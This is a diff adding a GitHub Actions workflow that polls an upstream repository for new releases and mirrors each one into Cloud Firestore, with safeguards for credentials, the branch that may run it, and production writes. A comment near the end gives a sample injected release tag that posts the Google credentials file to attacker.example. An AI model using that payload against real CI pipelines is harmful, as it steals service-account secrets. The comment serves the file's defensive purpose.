@@ -1,0 +1,313 @@
+name: Alpha release sync
+
+# Mirrors a newly published upstream Oqthara release into Cloud Firestore, and records whether
+# the mirror actually reflects it.
+#
+# Why this exists next to `firebase-sync.yml`
+# -------------------------------------------
+# `firebase-sync.yml` mirrors the tip of `main` once a day. That covers "the docs changed".
+# It does not cover "a release was published", which is the event that makes the site's release
+# channels meaningful. This workflow polls for that event every 15 minutes.
+#
+# Why a poll and not a `release` trigger
+# --------------------------------------
+# A GitHub `release` event fires only for releases published in *this* repository. Upstream
+# releases live in `Oqthara/oqthara`, which cannot dispatch an event here without a token
+# committed in that repository — unacceptable for a read-only upstream. Polling is the honest
+# mechanism, and the brief explicitly requires it.
+#
+# Catch-up is inherent, not bolted on
+# -----------------------------------
+# The workflow asks upstream for its newest published release, resolves the tag to a commit,
+# and compares that against the last release this repository *successfully* synchronized. A run
+# that never fired, was delayed, or was dropped costs nothing: the next run computes the same
+# difference and acts on it. There is no queue and no cursor to lose.
+#
+# Idempotence
+# -----------
+# A re-run after a successful sync decides "no action". A run that fails records the failure
+# without advancing the recorded release, so the next run retries it. The mirror itself is
+# hash-based, so even a redundant run writes identical bytes.
+#
+# Least privilege
+# ---------------
+# `contents: read` only. The job writes Firestore through the service account, never the GitHub
+# API, and it never deploys security rules — that stays in `firestore-rules.yml`.
+
+on:
+  schedule:
+    # Every 15 minutes. GitHub runs scheduled work on a best-effort basis and may delay or skip
+    # a run under load; the comparison above makes a missed run harmless.
+    - cron: "*/15 * * * *"
+  workflow_dispatch:
+    inputs:
+      force:
+        description: "Synchronize even when the recorded release already matches upstream"
+        type: boolean
+        default: false
+      dry_run:
+        description: "Detect only (print the decision, write nothing)"
+        type: boolean
+        default: false
+
+permissions:
+  contents: read
+
+# Every workflow that runs `scripts/sync-firestore.mjs` shares one concurrency group. Two
+# workflows that each serialize only themselves still race each other: both read `sync` state at
+# the start and commit batches later, so a full-tree run can publish an unpublish set computed
+# before another run created those documents. The group name is about the mirror, not the
+# workflow, so all writers queue behind each other.
+# `cancel-in-progress: false` queues instead of cancelling, so a run mid-write is never killed.
+concurrency:
+  group: firestore-mirror
+  cancel-in-progress: false
+
+jobs:
+  # A manual dispatch can name any branch. The `sync` job below holds the Firestore admin key,
+  # so if it ran the selected ref it would execute that branch's scripts with production
+  # credentials. `sync` is therefore pinned to `refs/heads/main` and checks out `main`
+  # explicitly, so the code that touches the key is always code that was reviewed on main.
+  # This job exists only to say why a dispatch elsewhere did nothing.
+  refused:
+    name: Explain why this ref is not allowed to synchronize
+    if: github.ref != 'refs/heads/main'
+    runs-on: ubuntu-latest
+    steps:
+      - name: Refuse
+        env:
+          REF: ${{ github.ref }}
+        run: |
+          echo "::error::Alpha release sync only runs from refs/heads/main (got ${REF})."
+          echo "This job holds FIREBASE_SERVICE_ACCOUNT and refuses to run scripts from an unreviewed ref."
+          echo "To recover, re-run the workflow from main: gh workflow run alpha-release-sync.yml --ref main"
+          exit 1
+
+  sync:
+    name: Detect and synchronize the newest Alpha release
+    # Scheduled runs are always on the default branch. A manual dispatch is the only way to
+    # reach another ref, and this is the check that stops it before the secret is ever in scope.
+    if: github.ref == 'refs/heads/main'
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    steps:
+      - name: Check out the site repository
+        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
+        with:
+          # Always `main`, never the dispatching ref: this job carries the Firestore admin key
+          # and must only ever execute reviewed code.
+          ref: main
+          # No job here pushes, so the job token has no reason to stay readable in .git/config.
+          persist-credentials: false
+
+      - name: Set up Node
+        uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4
+        with:
+          # Node 22 to match the other workflows. superstatic 10 (a firebase-tools dependency)
+          # accepts "20 || 22 || 24", so 24 would also work; one version across CI is simpler
+          # to reason about than three.
+          node-version: 22
+          cache: npm
+
+      - name: Install
+        run: npm ci
+
+      - name: Check for the service account secret
+        id: credential
+        env:
+          SERVICE_ACCOUNT: ${{ secrets.FIREBASE_SERVICE_ACCOUNT }}
+        run: |
+          set -euo pipefail
+          if [ -z "${SERVICE_ACCOUNT}" ]; then
+            echo "::warning::FIREBASE_SERVICE_ACCOUNT is not set. Releases cannot be synchronized or recorded."
+            echo "present=false" >> "$GITHUB_OUTPUT"
+            exit 0
+          fi
+          # shellcheck disable=SC2016  # the JavaScript below is single-quoted on purpose
+          node -e '
+            const raw = process.env.SERVICE_ACCOUNT;
+            let parsed;
+            try { parsed = JSON.parse(raw); } catch { console.error("::error::FIREBASE_SERVICE_ACCOUNT is not valid JSON"); process.exit(1); }
+            if (!parsed.client_email || !parsed.private_key) {
+              console.error("::error::FIREBASE_SERVICE_ACCOUNT is not a service account key");
+              process.exit(1);
+            }
+            console.log(`client_email: ${parsed.client_email}`);
+            console.log(`project_id: ${parsed.project_id}`);
+          '
+          echo "present=true" >> "$GITHUB_OUTPUT"
+
+      # Production writes are opt-in, and this is the switch. A repository variable is used
+      # rather than a secret because its value is not sensitive and an operator must be able to
+      # read it back: "is this repository allowed to write production?" is a question whose
+      # answer should be visible in `gh variable list`, not hidden behind a value nobody can see.
+      #
+      # Absent, empty, or any value other than "true" means disabled. The comparison is exact so
+      # a typo like "True" or "yes" fails closed rather than being read as consent.
+      #
+      # This step sets `enabled` for the write steps below; detection stays unguarded on purpose,
+      # so a disabled repository still reports what it would have done.
+      - name: Check the production-sync activation gate
+        id: gate
+        env:
+          ENABLED: ${{ vars.OQTHARA_PRODUCTION_SYNC }}
+        run: |
+          set -euo pipefail
+          if [ "${ENABLED:-}" = "true" ]; then
+            echo "enabled=true" >> "$GITHUB_OUTPUT"
+            echo "Production synchronization is ENABLED by the OQTHARA_PRODUCTION_SYNC variable."
+          else
+            echo "enabled=false" >> "$GITHUB_OUTPUT"
+            echo "::notice::Production synchronization is DISABLED. Set the repository variable OQTHARA_PRODUCTION_SYNC to \`true\` to allow writes to Firestore. Detection still runs; nothing is written."
+          fi
+
+      - name: Verify the credential identity and Cloud project
+        if: steps.credential.outputs.present == 'true'
+        env:
+          FIREBASE_SERVICE_ACCOUNT: ${{ secrets.FIREBASE_SERVICE_ACCOUNT }}
+        run: node scripts/check-firebase-access.mjs --identity-only
+
+      - name: Detect the newest upstream release
+        id: detect
+        # A detection run must not report success over an unreadable state document: the
+        # script exits 2 without a credential and 4 when Firestore cannot be read. Both are
+        # real failures here, because "changed=false" would otherwise be a guess.
+        if: steps.credential.outputs.present == 'true' || (github.event_name == 'workflow_dispatch' && inputs.dry_run)
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          FIREBASE_SERVICE_ACCOUNT: ${{ secrets.FIREBASE_SERVICE_ACCOUNT }}
+          # The script writes the `GITHUB_OUTPUT` protocol itself, so `changed`/`tag`/`sha` are
+          # set by the script rather than re-parsed out of the log.
+          DRY_RUN: ${{ inputs.dry_run && '--dry-run' || '' }}
+        run: node scripts/check-upstream-release.mjs ${DRY_RUN:+"$DRY_RUN"}
+
+      - name: Report a missing credential
+        if: steps.credential.outputs.present != 'true' && !(github.event_name == 'workflow_dispatch' && inputs.dry_run)
+        run: |
+          echo "::error::FIREBASE_SERVICE_ACCOUNT is not configured, so releases cannot be synchronized."
+          echo "Add the service account JSON as a repository secret, or run this workflow manually with dry_run=true."
+          exit 1
+
+      # `force` on a manual dispatch skips the comparison, but it must NOT mean "rerun the
+      # incremental path": an incremental pass compares recorded hashes to source hashes, so a
+      # document edited out of band in Firestore still matches its bookkeeping hash and is
+      # skipped. That is the whole class of damage this input exists to repair, so `force`
+      # selects a full reconciliation instead.
+      - name: Decide
+        id: decide
+        if: steps.detect.outputs.changed == 'true' || (github.event_name == 'workflow_dispatch' && inputs.force)
+        env:
+          FORCE: ${{ github.event_name == 'workflow_dispatch' && inputs.force }}
+          TAG: ${{ steps.detect.outputs.tag }}
+        run: |
+          set -euo pipefail
+          if [ "$FORCE" = "true" ]; then
+            echo "mode=full" >> "$GITHUB_OUTPUT"
+          else
+            echo "mode=incremental" >> "$GITHUB_OUTPUT"
+          fi
+          # Recording a failure needs to name the release it failed on, and a forced run may not
+          # have gone through detection's "changed" path.
+          if [ -z "$TAG" ]; then
+            echo "tag=forced" >> "$GITHUB_OUTPUT"
+          else
+            printf 'tag=%s\n' "$TAG" >> "$GITHUB_OUTPUT"
+          fi
+          echo "run=true" >> "$GITHUB_OUTPUT"
+
+      - name: No new release
+        if: steps.detect.outputs.changed == 'false' && !(github.event_name == 'workflow_dispatch' && inputs.force)
+        env:
+          REASON: ${{ steps.detect.outputs.reason }}
+        run: printf '::notice::%s\n' "$REASON"
+
+      # The activation gate covers `--full` too: a forced reconciliation is a manual trigger, so
+      # without this it would be the one path that bypasses the switch. A refused run is `skipped`
+      # rather than `success`, so the failure recorder below must exclude it explicitly.
+      - name: Synchronize the mirror
+        id: sync
+        if: steps.gate.outputs.enabled == 'true' && steps.decide.outputs.run == 'true' && !(github.event_name == 'workflow_dispatch' && inputs.dry_run)
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          FIREBASE_SERVICE_ACCOUNT: ${{ secrets.FIREBASE_SERVICE_ACCOUNT }}
+          # Scheduled polls stay incremental; only an operator asking for `force` pays for a
+          # full rewrite. Both values come from `Decide`, so the mode is decided once.
+          SYNC_MODE: ${{ steps.decide.outputs.mode }}
+        # The mirror reads `main`, which the detection step proved contains the release tag.
+        run: |
+          set -euo pipefail
+          if [ "$SYNC_MODE" = "full" ]; then
+            echo "Forced run: reconciling every mirrored document, not just the changed ones."
+            node scripts/sync-firestore.mjs --full
+          else
+            node scripts/sync-firestore.mjs
+          fi
+
+      # Both recording steps run even when the sync failed, so the failure is visible in state
+      # and the next scheduled run retries instead of believing the mirror is current.
+      #
+      # The failure recorder needs `!cancelled()`: a step whose `if:` has no status function gets
+      # an implicit `success()`, which is false once any earlier step failed - so the recorder
+      # that exists to describe a failure would be skipped precisely when there is one to record,
+      # the state document would keep the previous success, and the next run would believe the
+      # mirror was current. `!cancelled()` instead keeps it running through a failed sync while
+      # still not running when the job itself was cancelled.
+      # Recording is a production write of its own: it is what makes the next poll decide "no
+      # action". Recording a sync that this gate refused would advance the published-release
+      # pointer without ever publishing the release.
+      - name: Record a successful sync
+        if: ${{ !cancelled() && steps.sync.outcome == 'success' && steps.gate.outputs.enabled == 'true' }}
+        env:
+          FIREBASE_SERVICE_ACCOUNT: ${{ secrets.FIREBASE_SERVICE_ACCOUNT }}
+          OQ_RELEASE_TAG: ${{ steps.detect.outputs.tag }}
+          OQ_RELEASE_SHA: ${{ steps.detect.outputs.sha }}
+          OQ_RELEASE_HASH: ${{ steps.detect.outputs.hash }}
+        run: node scripts/check-upstream-release.mjs --record=ok
+
+      - name: Record a failed sync
+        if: ${{ !cancelled() && steps.gate.outputs.enabled == 'true' && steps.decide.outputs.run == 'true' && steps.sync.outcome != 'success' && steps.sync.outcome != 'skipped' && !(github.event_name == 'workflow_dispatch' && inputs.dry_run) }}
+        # `skipped` is excluded because that is what a run the activation gate refused looks
+        # like. Recording it as a failure would name a release that was never attempted.
+        env:
+          FIREBASE_SERVICE_ACCOUNT: ${{ secrets.FIREBASE_SERVICE_ACCOUNT }}
+          OQ_RELEASE_TAG: ${{ steps.decide.outputs.tag }}
+          OQ_RELEASE_SHA: ${{ steps.detect.outputs.sha }}
+          OQ_RELEASE_DETAIL: "the mirror sync did not succeed"
+        # `--record=failed` must never move the last-successful pointer, or the next poll would
+        # conclude the failed release had already been mirrored and stop retrying it.
+        run: node scripts/check-upstream-release.mjs --record=failed
+
+      # Detected values reach this step through `env:`, never interpolated into `run:`.
+      # A release tag is untrusted input: write access to the upstream repository is enough to
+      # create one, and `${{ }}` inside a `run:` block becomes shell source rather than data.
+      # A tag named `v1$(curl -s -d @$GOOGLE_APPLICATION_CREDENTIALS https://attacker.example)`
+      # would execute here, in a job that holds the Firestore admin key.
+      - name: Summarize
+        if: always()
+        env:
+          TAG: ${{ steps.detect.outputs.tag }}
+          SHA: ${{ steps.detect.outputs.sha }}
+          REASON: ${{ steps.detect.outputs.reason }}
+          DECISION: ${{ steps.detect.outputs.changed == 'true' && 'synchronize' || 'no action' }}
+          SYNC_OUTCOME: ${{ steps.sync.outcome }}
+          WRITES_ENABLED: ${{ steps.gate.outputs.enabled || 'unknown' }}
+        run: |
+          {
+            echo "## Alpha release sync"
+            echo ""
+            echo "| field | value |"
+            echo "| --- | --- |"
+            # shellcheck disable=SC2016  # the backticks are Markdown, not command substitution
+            printf '| upstream release | `%s` |\n' "$TAG"
+            # shellcheck disable=SC2016
+            printf '| commit | `%s` |\n' "$SHA"
+            printf '| decision | %s |\n' "$DECISION"
+            printf '| reason | %s |\n' "$REASON"
+            printf '| mirror sync | %s |\n' "$SYNC_OUTCOME"
+            if [ "$WRITES_ENABLED" != "true" ]; then
+              # shellcheck disable=SC2016  # the backticks are Markdown, not command substitution
+              printf '| production writes | **disabled** (OQTHARA_PRODUCTION_SYNC is not \`true\`) |\n'
+            else
+              printf '| production writes | enabled |\n'
+            fi
+          } >> "$GITHUB_STEP_SUMMARY"
